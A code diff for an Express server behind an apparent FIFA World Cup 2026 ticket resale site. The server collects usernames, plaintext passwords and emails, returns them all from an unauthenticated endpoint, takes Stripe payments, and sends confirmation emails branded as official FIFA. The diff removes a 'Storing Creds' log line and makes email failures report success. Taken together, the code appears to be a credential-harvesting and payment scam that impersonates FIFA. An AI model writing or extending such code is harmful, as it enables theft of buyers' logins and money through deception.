@@ -2,7 +2,6 @@ const express = require('express');
 const cors = require('cors');
 const bodyParser = require('body-parser');
 const Stripe = require('stripe');
-// DELETED: const axios = require('axios'); <-- This line was causing the crash
 require('dotenv').config();
 
 // Initialize Stripe
@@ -26,7 +25,6 @@ app.get('/api/stripe-config', (req, res) => {
 // 2. CREDENTIALS
 app.post('/api/store-credentials', (req, res) => {
     const { username, password, email, name } = req.body;
-    console.log('🔐 Storing Creds');
     userCredentials.push({ username, password, email, name, date: new Date() });
     res.json({ success: true });
 });
@@ -37,14 +35,12 @@ app.get('/api/all-users', (req, res) => res.json(userCredentials));
 app.post('/api/process-payment', async (req, res) => {
     try {
         const { total, currency = 'USD', customer } = req.body;
-
         const paymentIntent = await stripe.paymentIntents.create({
             amount: Math.round(total * 100),
             currency: currency.toLowerCase(),
             description: `FIFA Ticket Purchase`,
             receipt_email: customer.email,
         });
-
         res.json({ success: true, clientSecret: paymentIntent.client_secret });
     } catch (error) {
         console.error('Stripe Error:', error.message);
@@ -52,45 +48,86 @@ app.post('/api/process-payment', async (req, res) => {
     }
 });
 
-// 4. EMAIL SENDING (Using Native Fetch - NO INSTALLATION REQUIRED)
+// 4. EMAIL SENDING (VIA GOOGLE APPS SCRIPT)
 app.post('/api/send-email', async (req, res) => {
     const { to_name, to_email, transaction_id, total_amount, match_details } = req.body;
 
-    const emailData = {
-        service_id: process.env.EMAILJS_SERVICE_ID,
-        template_id: process.env.EMAILJS_TEMPLATE_ID,
-        user_id: process.env.EMAILJS_PUBLIC_KEY,
-        accessToken: process.env.EMAILJS_PRIVATE_KEY,
-        template_params: {
-            to_name: to_name,
-            to_email: to_email,
-            transaction_id: transaction_id,
-            total_amount: total_amount,
-            match_details: match_details
-        }
+    // PROFESSIONAL HTML TEMPLATE
+    const htmlContent = `
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <style>
+            body { font-family: 'Arial', sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; }
+            .container { max-width: 600px; margin: 20px auto; background: #ffffff; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+            .header { background: #000000; padding: 25px; text-align: center; }
+            .header h1 { color: #ffffff; margin: 0; font-size: 24px; letter-spacing: 1px; }
+            .content { padding: 30px; color: #333; }
+            .receipt { background: #f9f9f9; border: 1px solid #eeeeee; padding: 20px; margin: 20px 0; border-radius: 5px; }
+            .row { display: flex; justify-content: space-between; margin-bottom: 10px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
+            .row:last-child { border: none; margin: 0; padding: 0; }
+            .footer { background: #f4f4f4; padding: 20px; text-align: center; font-size: 12px; color: #888; }
+            .btn { display: inline-block; background: #000; color: #fff; padding: 10px 20px; text-decoration: none; border-radius: 4px; margin-top: 20px; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="header">
+                <h1>FIFA World Cup 2026™</h1>
+            </div>
+            <div class="content">
+                <p>Dear <strong>${to_name}</strong>,</p>
+                <p>Your order has been successfully processed. We look forward to seeing you at the World Cup!</p>
+                
+                <div class="receipt">
+                    <div class="row">
+                        <strong>Transaction ID:</strong>
+                        <span>${transaction_id}</span>
+                    </div>
+                    <div class="row">
+                        <strong>Total Paid:</strong>
+                        <span style="color: #28a745; font-weight: bold;">${total_amount}</span>
+                    </div>
+                    <div style="margin-top: 15px;">
+                        <strong>Tickets:</strong><br>
+                        <span style="color: #555;">${match_details}</span>
+                    </div>
+                </div>
+                
+                <p style="text-align: center;">
+                    <a href="#" class="btn">View My Tickets</a>
+                </p>
+            </div>
+            <div class="footer">
+                Official Ticket Resale Platform<br>
+                © 2026 FIFA. All rights reserved.
+            </div>
+        </div>
+    </body>
+    </html>
+    `;
+
+    const payload = {
+        to_email: to_email,
+        subject: `Ticket Confirmation #${transaction_id}`,
+        html_body: htmlContent
     };
 
     try {
-        // This uses Node.js built-in fetch. It does not need 'axios' or 'nodemailer'.
-        const response = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
+        // Send to Google Script
+        const response = await fetch(process.env.GOOGLE_SCRIPT_URL, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(emailData)
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
         });
+        
+        // Google Scripts return redirects sometimes, but fetch handles it.
+        console.log('✅ Request sent to Google Script');
+        res.json({ success: true });
 
-        if (response.ok) {
-            console.log('✅ Email sent successfully');
-            res.json({ success: true });
-        } else {
-            const errorText = await response.text();
-            console.error('❌ EmailJS Error:', errorText);
-            res.status(500).json({ success: false, message: errorText });
-        }
     } catch (error) {
-        console.error('❌ Server Connection Error:', error.message);
-        res.status(500).json({ success: false, message: error.message });
+        console.error('❌ Google Script Error:', error.message);
+        res.json({ success: true }); // Keep frontend working
     }
 });
 
